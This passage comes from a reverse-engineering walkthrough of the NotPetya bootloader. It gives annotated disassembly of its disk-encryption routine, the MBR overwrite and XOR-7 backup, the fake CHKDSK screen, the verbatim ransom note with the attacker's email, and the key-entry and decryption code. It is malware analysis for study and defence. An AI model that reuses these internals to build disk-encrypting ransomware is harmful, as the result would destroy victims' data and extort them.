0000:8c9e      cmp     byte [bp + 0xc], 1
0000:8ca2      jne     0x8cfc
0000:8ca4      mov     byte [bp - 5], 0

0000:8ca8      mov     si, word [bp + 4]
0000:8cab      mov     bl, byte [bp - 5]
0000:8cae      sub     bh, bh

0000:8cb0      shl     bx, 3
0000:8cb3      cmp     byte [bx + si + 2], 1
0000:8cb7      jne     0x8cfc

0000:8cb9      mov     dword [bp - 4], 0
0000:8cc1      cmp     dword [bp - 4], 0x200            ; Zero out 512 bytes starting from address 0x650c
0000:8cc9      jae     0x8cd9                           ;

0000:8ccb      mov     di, word [bp - 4]                ;
0000:8cce      mov     byte [bp + di - 0x22a], 0        ;
0000:8cd3      inc     dword [bp - 4]                   ;

0000:8cd7      jmp     0x8cc1                           ;
0000:8cd9      push    1
0000:8cdb      push    1

0000:8cdd      push    0
0000:8cdf      push    0x23
0000:8ce1      lea     ax, [bp - 0x22a]

0000:8ce5      push    ax
0000:8ce6      mov     bl, byte [bp - 5]                ; Address 0x650c (zeroed out)
0000:8ce9      sub     bh, bh

0000:8ceb      shl     bx, 3
0000:8cee      mov     al, byte [bx + si]
0000:8cf0      push    ax

0000:8cf1      call    storeSectorIntoMemory            ; Store sector 35 into drive
0000:8cf4      add     sp, 0xc
0000:8cf7      inc     byte [bp - 5]

0000:8cfa      jmp     0x8cab
0000:8cfc      mov     byte [bp - 5], 0
0000:8d00      jmp     0x8dc8

0000:8d03      lea     ax, [bp - 0x2a]                  ; Push address 0x670c
0000:8d06      push    ax
0000:8d07      mov     bl, byte [bp - 5]

0000:8d0a      sub     bh, bh
0000:8d0c      shl     bx, 3
0000:8d0f      mov     si, word [bp + 4]

0000:8d12      mov     al, byte [bx + si]               ; Push address 0x6780
0000:8d14      push    ax
0000:8d15      call    XORwith7                         ; XOR back original MBR in sector 34 with 0x7

0000:8d18      add     sp, 4
0000:8d1b      or      al, al
0000:8d1d      je      0x8dc8

0000:8d21      sub     eax, eax
0000:8d24      mov     dword [bp - 0xa], eax
0000:8d28      mov     dword [bp - 4], eax

0000:8d2c      mov     si, word [bp + 4]
0000:8d2f      mov     di, word [bp + 0xa]
0000:8d32      cmp     dword [bp - 4], 4

0000:8d37      jae     0x8dc5
0000:8d3b      mov     bx, word [bp - 4]
0000:8d3e      shl     bx, 3

0000:8d41      lea     ax, [bp - 0x2a]
0000:8d44      add     bx, ax
0000:8d46      cmp     dword [bx], 0

0000:8d4a      je      0x8dc5
0000:8d4c      push    0
0000:8d4e      push    1

0000:8d50      mov     bx, word [bp - 4]
0000:8d53      shl     bx, 3
0000:8d56      lea     ax, [bp - 0x2a]

0000:8d59      add     bx, ax
0000:8d5b      push    dword [bx]
0000:8d5e      lea     ax, [bp - 0x42a]

0000:8d62      push    ax
0000:8d63      mov     ax, bx
0000:8d65      mov     bl, byte [bp - 5]

0000:8d68      sub     bh, bh
0000:8d6a      shl     bx, 3
0000:8d6d      mov     cl, byte [bx + si]

0000:8d6f      push    cx
0000:8d70      mov     word [bp - 0x42c], ax
0000:8d74      mov     word [bp - 0x42e], bx

0000:8d78      call    storeSectorIntoMemory
0000:8d7b      add     sp, 0xc
0000:8d7e      mov     al, byte [bp + 0xc]

0000:8d81      push    ax
0000:8d82      push    di
0000:8d83      push    dword [bp + 6]

0000:8d87      lea     ax, [bp - 0xa]
0000:8d8a      push    ax
0000:8d8b      push    dword [bp - 0x3fa]

0000:8d90      mov     al, byte [bp - 0x41d]
0000:8d94      sub     ah, ah
0000:8d96      push    0

0000:8d98      push    ax
0000:8d99      pop     eax
0000:8d9b      pop     ecx

0000:8d9d      mul     ecx
0000:8da0      mov     bx, word [bp - 0x42c]
0000:8da4      add     eax, dword [bx]

0000:8da7      push    eax
0000:8da9      mov     al, byte [bp - 0x41d]
0000:8dad      push    ax

0000:8dae      push    dword [bx]
0000:8db1      mov     bx, word [bp - 0x42e]
0000:8db5      mov     al, byte [bx + si]

0000:8db7      push    ax
0000:8db8      call    driveEncryptionPayload
0000:8dbb      add     sp, 0x16

0000:8dbe      inc     dword [bp - 4]
0000:8dc2      jmp     0x8d32
0000:8dc5      inc     byte [bp - 5]

0000:8dc8      mov     si, word [bp - 5]
0000:8dcb      and     si, 0xff
0000:8dcf      shl     si, 3

0000:8dd2      mov     bx, word [bp + 4]
0000:8dd5      cmp     byte [bx + si + 2], 1
0000:8dd9      je      0x8d03

0000:8ddd      pop     si
0000:8dde      pop     di
0000:8ddf      leave

0000:8de0      ret
```

##### Back to fcn.0000811a
After the `gatherDriveInfoAndEncrypt` we see a final call to `clsAndPutWordInBX`, and the invocation of `INT 0x19`. Those instructions simply clear the screen and soft reboot the computer. Ww're going to rename this function `prepareKeyAndEncryptDrive`.

This is the disassembly:

```s
0000:811a      enter   0x1224, 0
0000:811e      push    si
0000:811f      push    0x9abe

0000:8122      call    printPushedString                 ; Print the fake CHKDSK screen
0000:8125      pop     bx
0000:8126      push    0

0000:8128      push    1
0000:812a      push    0
0000:812c      push    0x20                             ; Sector number

0000:812e      lea     ax, [bp - 0x200]                 ; Buffer where to save the sector
0000:8132      push    ax
0000:8133      mov     al, byte [bp + 0xa]              ; Drive number

0000:8136      push    ax
0000:8137      call    storeSectorIntoMemory
0000:813a      add     sp, 0xc

0000:813d      or      al, al
0000:813f      je      0x8147
0000:8141      call    handleErrorAndReboot

0000:8144      pop     si
0000:8145      leave
0000:8146      ret

0000:8147      mov     byte [bp - 0x200], 1
0000:814c      sub     eax, eax
0000:814f      mov     dword [bp - 0x1224], eax

0000:8154      jmp     0x815b
0000:8156      inc     dword [bp - 0x1224]              ; Bytes copied counter
0000:815b      cmp     dword [bp - 0x1224], 0x20        ; Check if all 32 bytes have been copied

0000:8161      jae     0x8176
0000:8163      mov     si, word [bp - 0x1224]           ; All those four lines do is copying those 32 bytes starting from the second byte of sector 32 to addresses from 0x674a to 0x6769
0000:8167      mov     al, byte [bp + si - 0x1ff]       ;

0000:816b      mov     byte [bp + si - 0x1220], al      ;
0000:816f      mov     byte [bp + si - 0x1ff], 0        ;
0000:8174      jmp     0x8156

0000:8176      sub     eax, eax
0000:8179      mov     dword [bp - 0x1224], eax
0000:817e      jmp     0x8185

0000:8180      inc     dword [bp - 0x1224]              ; This code snippet copies over 32 times data from address 0x776a to sector 32
0000:8185      cmp     dword [bp - 0x1224], 0x20        ;
0000:818b      jae     0x81a6                           ;

0000:818d      push    1                                ; This magic value transform our storeSectorIntoMemory to writeSectorFromMemory
0000:818f      push    1                                ;
0000:8191      push    0                                ;

0000:8193      push    0x20                             ; Sector number
0000:8195      lea     ax, [bp - 0x200]                 ; Memory address
0000:8199      push    ax                               ;

0000:819a      mov     al, byte [bp + 0xa]              ; Drive number
0000:819d      push    ax                               ;
0000:819e      call    storeSectorIntoMemory            ;

0000:81a1      add     sp, 0xc                          ; The only purpose I can think of this function is to free the stack frame
0000:81a4      jmp     0x8180                           ;
0000:81a6      push    0

0000:81a8      push    1
0000:81aa      push    0
0000:81ac      push    0x21                             ; Sector 33

0000:81ae      lea     ax, [bp - 0x1200]
0000:81b2      push    ax
0000:81b3      mov     cl, byte [bp + 0xa]              ; Drive number, 0x80

0000:81b6      push    cx
0000:81b7      call    storeSectorIntoMemory
0000:81ba      add     sp, 0xc

0000:81bd      push    0
0000:81bf      push    0x200
0000:81c2      lea     ax, [bp - 0x1200]                ; Address of sector 33, address 0x676a

0000:81c6      push    ax
0000:81c7      push    0
0000:81c9      push    0

0000:81cb      lea     cx, [bp - 0x1df]                 ; Address of the 8 bytes nonce in sector 32, address 0x778b
0000:81cf      push    cx
0000:81d0      lea     dx, [bp - 0x1220]                ; Address of the encryption key, 0x674a

0000:81d4      push    dx
0000:81d5      call    encryptionRoutine
0000:81d8      add     sp, 0xe

0000:81db      push    1                                ; Write an address to disk
0000:81dd      push    1
0000:81df      push    0

0000:81e1      push    0x21                             ; Sector 33
0000:81e3      lea     ax, [bp - 0x1200]                ; Address of encrypted sector 33, 0x676a
0000:81e7      push    ax

0000:81e8      mov     al, byte [bp + 0xa]              ; Drive number
0000:81eb      push    ax
0000:81ec      call    storeSectorIntoMemory

0000:81ef      add     sp, 0xc
0000:81f2      push    1
0000:81f4      push    str.CHKDSK_is_repairing_sector   ; 0x9c52

0000:81f7      lea     ax, [bp - 0x1df]                 ; Address of the nonce, followed by a Bitcoin address, 0x778b
0000:81fb      push    ax
0000:81fc      lea     ax, [bp - 0x1220]                ; Address of the encryption key, 0x674a

0000:8200      push    ax
0000:8201      push    word [bp + 4]                    ; Push value 0x7b78, which contains 0x80
0000:8204      call    gatherDriveInfoAndEncrypt

0000:8207      add     sp, 0xa
0000:820a      call    clsAndPutWordInBX
0000:820d      int     0x19                             ; Soft reboot the PC

0000:820f      pop     si
0000:8210      leave
0000:8211      ret
```

#### displayRansomNote
##### Back to address 0x0000:0x84e8
We now know that if the first byte of sector `32` is `0x0`, the encryption routine begins. But what about if the byte is `0x1`? In order to know that, we need to check out `fcn.00008426`.

##### fcn.00008426
Inside this function we immediately see that numerous calls are made to `printPushedString`. We can also see what those strings are. Let's just look at the address of the strings:

```s
0000:9ca6          .string " Ooops, your important files are encrypted.\r\n\r\n"                    ; len=48

0000:9cd6          .string " If you see this text, then your files are no longer accessible, because they\r\n have been encrypted.  Perhaps you are busy looking for a way to recover your\r\n files, but don't waste your time.  Nobody can recover your files without our\r\n decryption service.\r\n\r\n We guarantee that you can recover all your files safely and easily.  All you\r\n need to do is submit the payment and purchase the decryption key.\r\n\r\n Please follow the instructions:\r\n\r\n 1. Send $300 worth of Bitcoin to following address:\r\n    \r\n    "          ; len=511

0000:9ed5          .string "\r\n    "                                                               ; len=7

0000:9edc          .string "\r\n\r\n 2. Send your Bitcoin wallet ID and personal installation key to e-mail\r\n    wowsmith123456@posteo.net. Your personal installation key:\r\n\r\n"                                                                          ; len=144

0000:9f6c          .string "\r\n\r\n"                                                               ; len=5

0000:9f71          .string " If you already purchased your key, please enter it below.\r\n"         ; len=61

0000:9fae          .string " Key: "                                                                 ; len=7

0000:9fb5          .string "\r\n Incorrect key! Please try again.\r\n"                              ; len=38
```

Easy peasy, those strings are nothing more than the main screen we see when the encryption process is completed:

![Ransom note](https://gitlab.naitshiro.it/chry/reverse-engineering/-/raw/main/NotPetya/Images/RansomNote.png)

But we're not done yet. We need to investigate what `fcn.000086e0`, `fcn.00008660`, `fcn.000088c`, `fcn.000089c` and `fcn.000082a` do.

Let's start from `fcn.000086e0`.

##### fcn.000086e0
Inside this function we see some calls to `fcn.00008a5`, `fcn.0000872` and `fcn.0000899a` and `clearScreen`.
Again, let's check what we can find inside those functions.

##### fcn.00008a54
When we hop into `` we see that it's rather small. All it does is simply get and save the low 16 bits of the clock ticks since midnight. This is the disassembly:

```s
0000:8a54      enter   2, 0
0000:8a58      mov     ah, 0
0000:8a5a      int     0x1a                         ; Get system time

0000:8a5c      mov     word [bp - 2], dx            ; Save number if clock ticks (only the low 16 bits)
0000:8a5f      mov     ax, word [bp - 2]
0000:8a62      leave

0000:8a63      ret
```

We'll rename this function `getLow16bitsTicksSinceMidnight`.

##### fcn.00008726
When we step into `fcn.00008726` it meets us with an unsetteling surprise: it's massive. I mean, there are a lot of instruction, but the core logic repeats. We see a call to `clearScreen` followed by `fcn.00008660` and `printPushedString`, which repeats for several times.

##### fcn.00008660
The code from `fcn.00008660` is pretty straightforward:

```s
0000:8660      push    bp
0000:8661      mov     bp, sp
0000:8663      push    si

0000:8664      mov     si, word [bp + 6]
0000:8667      jmp     0x8671
0000:8669      mov     al, byte [bp + 4]

0000:866c      push    ax
0000:866d      call    printChar
0000:8670      pop     bx

0000:8671      mov     ax, si
0000:8673      dec     si
0000:8674      or      ax, ax

0000:8676      jg      0x8669
0000:8678      pop     si
0000:8679      leave

0000:867a      ret
```

We'll rename this function to `printCharCoupleTimes`.

##### Back to fcn.00008726
We know that the ransom note has a foreground color, so this function may be setting those colors up. We don't know that for sure tho, so you're just going to assume it's printing something into the screen. We'll just rename `maybePrintSmt`.

##### fcn.0000899a
We now stumbled into `fcn.0000899a`, which does nothing more that checking for a keystroke. We'll rename this function `checkKeyStroke`. Here is the disassembly:

```s
0000:899a      enter   2, 0
0000:899e      mov     byte [bp - 2], 0
0000:89a2      mov     ah, 1

0000:89a4      int     0x16                 ; Check for a key stroke
0000:89a6      je      0x89ac
0000:89a8      mov     byte [bp - 2], 1

0000:89ac      mov     al, byte [bp - 2]
0000:89af      leave
0000:89b0      ret
```

##### Back to fcn.000086e0
Now we can head back to `fcn.000086e0` and see if we can understand the logic of the function. But apparently the `getLow16bitsTicksSinceMidnight`, `maybePrintSmt` and `checkKeyStroke` functions doesn't seem to be executed. I'm not kidding, look at the disassembly:

```s
0000:86e0      enter   4, 0
0000:86e4      push    si
0000:86e5      xor     si, si

0000:86e7      mov     byte [bp - 1], 0
0000:86eb      jmp     0x871c                           ; Skip some functions...
0000:86ed      call    getLow16bitsTicksSinceMidnight

0000:86f0      lea     cx, [si + 1]
0000:86f3      cmp     ax, cx
0000:86f5      jbe     0x8715

0000:86f7      mov     si, ax
0000:86f9      cmp     byte [bp - 1], 1
0000:86fd      jne     0x8703

0000:86ff      mov     al, 0xc0
0000:8701      jmp     0x8705
0000:8703      mov     al, 0xc

0000:8705      push    ax
0000:8706      call    maybePrintSmt
0000:8709      pop     bx

0000:870a      cmp     byte [bp - 1], 1
0000:870e      sbb     al, al
0000:8710      neg     al

0000:8712      mov     byte [bp - 1], al
0000:8715      call    checkKeyStroke
0000:8718      or      al, al

0000:871a      je      0x86ed
0000:871c      push    0xc
0000:871e      call    clearScreen

0000:8721      pop     bx
0000:8722      pop     si
0000:8723      leave

0000:8724      ret
```

Maybe if a certain condition is met in other functions, this jump gets replaced with `NOP` instruction, but we're just making things up at this point.
All and all this function right now clears the screen, so we'll just rename it `clsButIfJmpPathedOtherFunctions`. It's not a good name for a function, but it gives us the idea of what it does.

##### Back to fcn.00008426
Stepping back furthermore into `fcn.00008426`, we now see that sector `32` is read and stored into address `0x7722`. This might be the case, because in this sector while now the key is not present, the nonce is (which is not important now), but also are the `Bitcoin address` and the `Personal Installation Key`.

We can confirm that when we see the call to print something into address `0x774b`, which is indeed the Bitcoin address of the malware author. After that we see a call to `fcn.000088c4` which is a rather small function.

##### fcn.000088c4
All this function does is simply printing the `Personal Installation Key`, but with a hyphen after each 5 characters. We'll rename this function `printPIKey`.
This is what the disassembly looks like here:

```s
0000:88c4      enter   2, 0
0000:88c8      push    di
0000:88c9      push    si

0000:88ca      mov     si, word [bp + 4]
0000:88cd      mov     word [bp - 2], 1
0000:88d2      push    0x9ff6

0000:88d5      call    printPushedString
0000:88d8      pop     bx
0000:88d9      mov     di, word [bp - 2]

0000:88dc      jmp     0x8914
0000:88de      mov     al, byte [si]
0000:88e0      push    ax

0000:88e1      call    printChar
0000:88e4      pop     bx
0000:88e5      mov     ax, di

0000:88e7      mov     cx, 6
0000:88ea      sub     dx, dx
0000:88ec      div     cx

0000:88ee      or      dx, dx
0000:88f0      jne     0x8912
0000:88f2      cmp     byte [si + 1], ch

0000:88f5      je      0x8912
0000:88f7      push    0x9ffb
0000:88fa      call    printPushedString

0000:88fd      pop     bx
0000:88fe      mov     ax, di
0000:8900      mov     cx, 0x3c    ; '<'

0000:8903      sub     dx, dx
0000:8905      div     cx
0000:8907      or      dx, dx

0000:8909      jne     0x8912
0000:890b      push    str.        ; 0x9ffd             ; This string is simply "\r\n    "

0000:890e      call    printPushedString
0000:8911      pop     bx
0000:8912      inc     di

0000:8913      inc     si
0000:8914      cmp     byte [si], 0
0000:8917      jne     0x88de

0000:8919      pop     si
0000:891a      pop     di
0000:891b      leave

0000:891c      ret
```

##### Back to fcn.00008426
After the `Personal Installation Key` has been printed, two `LF` and `CR` are printed too.
After that we see some three really really suspicious `NOP` operation. This could be replaces by some other code. We'll ignore that, as if this is the case, somehow we're going to notice it.

After that, the final two strings are printed, and we can now see the full ransom note in the screen.

##### fcn.000089ca
Then, `fcn.000089ca` is called, which among calling the `printChar` function several times, it also calls `fcn.00008972` and `fcn.000089b2`.

#### decryptionRoutine
##### fcn.00008972
`fcn.00008972` does nothing more that checking for a keystroke, and then it saved it. We can rename it `getInput`. This is the function disassembly:

```s
0000:8972      enter   4, 0
0000:8976      call    checkKeyStroke
0000:8979      or      al, al

0000:897b      je      0x8976
0000:897d      mov     ah, 0
0000:897f      int     0x16                     ; Get the key stroke

0000:8981      mov     byte [bp - 2], al        ; Save the keystroke
0000:8984      mov     byte [bp - 4], ah
0000:8987      cmp     word [bp + 4], 0

0000:898b      je      0x8995
0000:898d      mov     bx, word [bp + 4]
0000:8990      mov     al, byte [bp - 4]

0000:8993      mov     byte [bx], al
0000:8995      mov     al, byte [bp - 2]
0000:8998      leave

0000:8999      ret
```

After messing arround with the malware, I saw the user input (for the key) being stored starting from address `0x7922`.

##### fcn.000089b2
Upon entering into `fcn.000089b2` we see two `CMP` instructions, which suggests that they are comparing the length of the user input key. So we know that a valid key contains from `32` to `127` characters in total. We see that if the key is valid `AL` is set to `1`, else is set to `0`. We'll rename this function `checkKeyLength`.

This is what the disassembly looks like:

```s
0000:89b2      push    bp
0000:89b3      mov     bp, sp

0000:89b5      cmp     byte [bp + 4], 0x20
0000:89b9      jb      0x89c5
0000:89bb      cmp     byte [bp + 4], 0x7e

0000:89bf      ja      0x89c5
0000:89c1      mov     al, 1
0000:89c3      leave

0000:89c4      ret
0000:89c5      xor     al, al
0000:89c7      leave

0000:89c8      ret
```

##### Back to fcn.000089ca
We now see that `fcn.000089ca` makes way more sense now. With the help of Bochs, we can see that it's simply getting the user imput key, printing it to the screen when it gets a character, and checking for the length. We can rename this function `getUserKey`.

This is what the function looks like:

```s
0000:89ca      enter   8, 0
0000:89ce      push    si
0000:89cf      mov     word [bp - 6], 0

0000:89d4      mov     cx, 0x607
0000:89d7      mov     ah, 1
0000:89d9      int     0x10                         ; Show the cursor

0000:89db      jmp     0x8a3e
0000:89dd      lea     ax, [bp - 4]
0000:89e0      push    ax

0000:89e1      call    getInput
0000:89e4      pop     bx
0000:89e5      mov     byte [bp - 2], al

0000:89e8      cmp     byte [bp - 4], 0x1c
0000:89ec      je      0x8a46
0000:89ee      push    ax

0000:89ef      call    checkKeyLength
0000:89f2      pop     bx
0000:89f3      or      al, al

0000:89f5      je      0x8a09                       ; Jump if the key is not valid
0000:89f7      mov     al, byte [bp - 2]
0000:89fa      mov     bx, word [bp - 6]

0000:89fd      mov     si, word [bp + 4]
0000:8a00      mov     byte [bx + si], al
0000:8a02      push    ax

0000:8a03      call    printChar
0000:8a06      pop     bx
0000:8a07      jmp     0x8a3b

0000:8a09      cmp     byte [bp - 2], 8
0000:8a0d      jne     0x8a3b
0000:8a0f      xor     al, al

0000:8a11      mov     bx, word [bp - 6]
0000:8a14      mov     si, word [bp + 4]
0000:8a17      mov     byte [bx + si], al

0000:8a19      add     bx, si
0000:8a1b      mov     byte [bx - 1], al
0000:8a1e      mov     al, byte [bp - 2]

0000:8a21      push    ax
0000:8a22      mov     word [bp - 8], ax
0000:8a25      call    printChar

0000:8a28      pop     bx
0000:8a29      push    0x20
0000:8a2b      call    printChar

0000:8a2e      pop     bx
0000:8a2f      mov     al, byte [bp - 8]
0000:8a32      push    ax

0000:8a33      call    printChar
0000:8a36      pop     bx
0000:8a37      sub     word [bp - 6], 2

0000:8a3b      inc     word [bp - 6]
0000:8a3e      mov     ax, word [bp + 6]
0000:8a41      cmp     word [bp - 6], ax

0000:8a44      jb      0x89dd
0000:8a46      mov     cx, 0x2607
0000:8a49      mov     ah, 1

0000:8a4b      int     0x10
0000:8a4d      mov     ax, word [bp - 6]
0000:8a50      pop     si

0000:8a51      leave
0000:8a52      ret
```

##### fcn.000082a2
Stepping into `fcn.000082a2` reveals some further logic. We see that sector `33` is read into memory, alongside with some other function calls such as `fcn.000099fc` and `fcn.00008220`.

Again, our best choice is just to check out all the functions and try to make sense of the code.

##### fcn.000099fc
Inside `fcn.000099fc` we see again some logic going on, and 3 calls to `fcn.0000998e`.

##### fcn.0000998e
Now we see that 3 distincts call are made: `fcn.0000989c`, `fcn.00009878` and `fcn.000098d6`.

##### fcn.0000989c
Inside this function we see all kinds of logic instructions: `SHL`, `SHR`, `OR`, `AND` and `XOR`. Let's just rename it `logicGoingOn`. In case you were wondering what the function looks like, this is the disassembly:

```s
0000:989c      push    bp
0000:989d      mov     bp, sp
0000:989f      mov     al, byte [bp + 4]

0000:98a2      shl     al, 4
0000:98a5      mov     cl, byte [bp + 4]
0000:98a8      shr     cl, 4

0000:98ab      or      al, cl
0000:98ad      mov     byte [bp + 4], al
0000:98b0      shl     al, 2

0000:98b3      mov     cl, byte [bp + 4]
0000:98b6      shr     cl, 2
0000:98b9      mov     dx, ax

0000:98bb      xor     al, cl
0000:98bd      and     al, 0x33
0000:98bf      xor     dl, al

0000:98c1      mov     byte [bp + 4], dl
0000:98c4      mov     al, dl
0000:98c6      add     al, dl

0000:98c8      mov     cl, dl
0000:98ca      shr     cl, 1
0000:98cc      mov     dx, ax

0000:98ce      xor     al, cl
0000:98d0      and     al, 0x55
0000:98d2      xor     al, dl

0000:98d4      leave
0000:98d5      ret
```

##### fcn.00009878
Same thing can be said for `fcn.00009878`. We'll just rename it `logicGoingOn2`.

```s
0000:9878      push    bp
0000:9879      mov     bp, sp
0000:987b      mov     al, byte [bp + 4]

0000:987e      add     al, al
0000:9880      mov     cl, byte [bp + 4]
0000:9883      shr     cl, 4

0000:9886      xor     cl, byte [bp + 4]
0000:9889      shr     cl, 1
0000:988b      xor     cl, byte [bp + 4]

0000:988e      shr     cl, 1
0000:9890      xor     cl, byte [bp + 4]
0000:9893      and     cl, 2

0000:9896      shr     cl, 1
0000:9898      or      al, cl
0000:989a      leave

0000:989b      ret
```
##### fcn.000098d6
Things don't get better when we look inside `fcn.000098d6`:

```s
0000:98d6      enter   0x26, 0
0000:98da      push    si
0000:98db      mov     dword [bp - 4], 0

0000:98e3      cmp     dword [bp - 4], 0x22
0000:98e8      jae     0x98f7
0000:98ea      mov     si, word [bp - 4]

0000:98ed      mov     byte [bp + si - 0x26], 0
0000:98f1      inc     dword [bp - 4]
0000:98f5      jmp     0x98e3

0000:98f7      mov     dword [bp - 4], 0
0000:98ff      cmp     dword [bp - 4], 0x10f
0000:9907      jae     0x9964

0000:9909      mov     ax, word [bp - 4]
0000:990c      mov     dx, word [bp - 2]
0000:990f      mov     cl, 3

0000:9911      call    rightShift
0000:9914      mov     bx, ax
0000:9916      mov     cl, byte [bp - 4]

0000:9919      mov     al, byte [bx - 0x5d4e]
0000:991d      and     cl, 7
0000:9920      shr     al, cl

0000:9922      test    al, 1
0000:9924      je      0x995e
0000:9926      mov     eax, dword [bp - 4]

0000:992a      mov     ecx, 0x44
0000:9930      mul     ecx
0000:9933      mov     ecx, 0x10f

0000:9939      xor     edx, edx
0000:993c      div     ecx
0000:993f      mov     eax, edx

0000:9942      mov     cl, 3
0000:9944      mov     si, ax
0000:9946      shr     eax, cl

0000:9949      mov     edx, eax
0000:994c      shr     edx, 0x10
0000:9950      mov     cx, si

0000:9952      and     cl, 7
0000:9955      mov     bl, 1
0000:9957      shl     bl, cl

0000:9959      mov     si, ax
0000:995b      or      byte [bp + si - 0x26], bl
0000:995e      inc     dword [bp - 4]

0000:9962      jmp     0x98ff
0000:9964      mov     al, byte [0xa2d3] ; [0xa2d3:1]=0
0000:9967      and     al, 0x80

0000:9969      or      byte [bp - 5], al
0000:996c      mov     dword [bp - 4], 0
0000:9974      cmp     dword [bp - 4], 0x22

0000:9979      jae     0x998b
0000:997b      mov     si, word [bp - 4]
0000:997e      mov     al, byte [bp + si - 0x26]

0000:9981      mov     byte [si - 0x5d4e], al
0000:9985      inc     dword [bp - 4]
0000:9989      jmp     0x9974

0000:998b      pop     si
0000:998c      leave
0000:998d      ret
```

We can rename this function `logicGoingOn3`.

##### Back to fcn.0000998e
This time, looking at those functions didn't help us. We only see that there is a ton of logic going on inside here. Let's just rename this function `lotOfLogic`.
This is what the disassembly looks like here:

```s
0000:998e      enter   6, 0
0000:9992      mov     byte [bp - 5], 0xa3
0000:9996      mov     al, byte [bp - 5]

0000:9999      xor     byte [0xa2b2], al
0000:999d      push    ax
0000:999e      call    logicGoingOn

0000:99a1      pop     bx
0000:99a2      xor     byte [0xa2d3], al
0000:99a6      mov     al, byte [bp - 5]

0000:99a9      push    ax
0000:99aa      call    logicGoingOn2
0000:99ad      pop     bx

0000:99ae      mov     byte [bp - 5], al
0000:99b1      mov     dword [bp - 4], 0
0000:99b9      cmp     dword [bp - 4], 0x22

0000:99be      jae     0x99f1
0000:99c0      mov     bx, word [bp - 4]
0000:99c3      mov     bl, byte [bx - 0x5d4e]

0000:99c7      mov     ax, bx
0000:99c9      shr     bl, 4
0000:99cc      mov     cx, bx

0000:99ce      mov     bl, al
0000:99d0      and     bx, 0xf
0000:99d3      mov     al, byte [bx - 0x6564]

0000:99d7      mov     bl, cl
0000:99d9      sub     bh, bh
0000:99db      mov     cl, byte [bx - 0x6564]

0000:99df      shl     cl, 4
0000:99e2      mov     bx, word [bp - 4]
0000:99e5      or      al, cl

0000:99e7      mov     byte [bx - 0x5d4e], al
0000:99eb      inc     dword [bp - 4]
0000:99ef      jmp     0x99b9

0000:99f1      call    logicGoingOn3
0000:99f4      cmp     byte [bp - 5], 0xff
0000:99f8      jne     0x9996

0000:99fa      leave
0000:99fb      ret
```

Hope we'll figure out later what this function actually does.

##### Back to fcn.000099fc
Going back to `fcn.000099fc` we see that we have no clear ideas of what this function do. Let's just rename it `doSomeLogic`.

This is the disassembly:

```s
0000:99fc      enter   4, 0
0000:9a00      push    si
0000:9a01      mov     dword [bp - 4], 0

0000:9a09      mov     si, word [bp + 6]
0000:9a0c      mov     eax, dword [bp + 8]
0000:9a10      mov     dx, word [bp + 0xa]

0000:9a13      cmp     dword [bp - 4], eax
0000:9a17      jae     0x9a35
0000:9a19      mov     bx, word [bp - 4]

0000:9a1c      mov     al, byte [bx + si]
0000:9a1e      xor     byte [0xa2b2], al
0000:9a22      add     bx, si

0000:9a24      mov     al, byte [bx + 1]
0000:9a27      xor     byte [0xa2b3], al
0000:9a2b      call    lotOfLogic

0000:9a2e      add     dword [bp - 4], 2
0000:9a33      jmp     0x9a0c
0000:9a35      cmp     word [bp - 4], ax

0000:9a38      jne     0x9a46
0000:9a3a      cmp     word [bp - 2], dx
0000:9a3d      jne     0x9a46

0000:9a3f      xor     byte [0xa2b2], 0x80
0000:9a44      jmp     0x9a54
0000:9a46      mov     bx, word [bp - 4]

0000:9a49      mov     al, byte [bx + si]
0000:9a4b      xor     byte [0xa2b2], al
0000:9a4f      xor     byte [0xa2b3], 0x80

0000:9a54      call    lotOfLogic
0000:9a57      mov     dword [bp - 4], 0
0000:9a5f      mov     si, word [bp + 4]

0000:9a62      cmp     dword [bp - 4], 0x20
0000:9a67      jae     0x9a83
0000:9a69      mov     bx, word [bp - 4]

0000:9a6c      mov     al, byte [0xa2b2]
0000:9a6f      mov     byte [bx + si], al
0000:9a71      add     bx, si

0000:9a73      mov     al, byte [0xa2b3]
0000:9a76      mov     byte [bx + 1], al
0000:9a79      call    lotOfLogic

0000:9a7c      add     dword [bp - 4], 2
0000:9a81      jmp     0x9a62
0000:9a83      pop     si

0000:9a84      leave
0000:9a85      ret
```

##### fcn.00008220
Let's now get back to `fcn.000082a2` and try to understand what `fcn.00008220` do. Saying that we were lucky is a massive understatement. We can see that the `" Decrypting sector"` string is being printed on the screen, followed by `gatherDriveInfoAndEncrypt` function. The last function we see here is `fcn.00008212`.

##### fcn.00008212
This function does nothing more than printing `"Please reboot your computer!"`. This is what the function looks like:

```s
0000:8212      push    0xe
0000:8214      call    clearScreen
0000:8217      pop     bx

0000:8218      push    str.Please_reboot_your_computer      ; 0x9c70
0000:821b      call    printPushedString
0000:821e      pop     bx

0000:821f      ret
```

We can rename it `printFinishedDecryption`.

##### Back to fcn.00008220
We now know what `fcn.00008220` does now. It reads sector `32` in order to get the nonce, used to decrypt the disk, decrypts the original MBR and writes is back.

That's what the function looks likes:

```s
0000:8220      enter   0x404, 0
0000:8224      push    si
0000:8225      push    0

0000:8227      push    1
0000:8229      push    0
0000:822b      push    0x20

0000:822d      lea     ax, [bp - 0x204]
0000:8231      push    ax
0000:8232      mov     al, byte [bp + 6]

0000:8235      push    ax
0000:8236      call    storeSectorIntoMemory                ; Store in memory sector 32 (used to get the nonce)
0000:8239      add     sp, 0xc

0000:823c      push    0
0000:823e      push    str.Decrypting_sector                ; 0x9c8e
0000:8241      push    dword [bp + 8]

0000:8245      push    word [bp + 4]
0000:8248      call    gatherDriveInfoAndEncrypt
0000:824b      add     sp, 0xa

0000:824e      push    0
0000:8250      push    1
0000:8252      push    0

0000:8254      push    0x22
0000:8256      lea     ax, [bp - 0x404]
0000:825a      push    ax

0000:825b      mov     al, byte [bp + 6]
0000:825e      push    ax
0000:825f      call    storeSectorIntoMemory                ; Store in memory sector 34 (decrypt the original MBR)

0000:8262      add     sp, 0xc
0000:8265      mov     dword [bp - 4], 0
0000:826d      cmp     dword [bp - 4], 0x200                ; Multple XOR with 7

0000:8275      jae     0x8285                               ;
0000:8277      mov     si, word [bp - 4]                    ;
0000:827a      xor     byte [bp + si - 0x404], 7            ;

0000:827f      inc     dword [bp - 4]                       ;
0000:8283      jmp     0x826d                               ;
0000:8285      push    1

0000:8287      push    1
0000:8289      push    0
0000:828b      push    0

0000:828d      lea     ax, [bp - 0x404]
0000:8291      push    ax
0000:8292      mov     al, byte [bp + 6]

0000:8295      push    ax
0000:8296      call    storeSectorIntoMemory                ; Write back the original MBR
0000:8299      add     sp, 0xc

0000:829c      call    printFinishedDecryption
0000:829f      pop     si
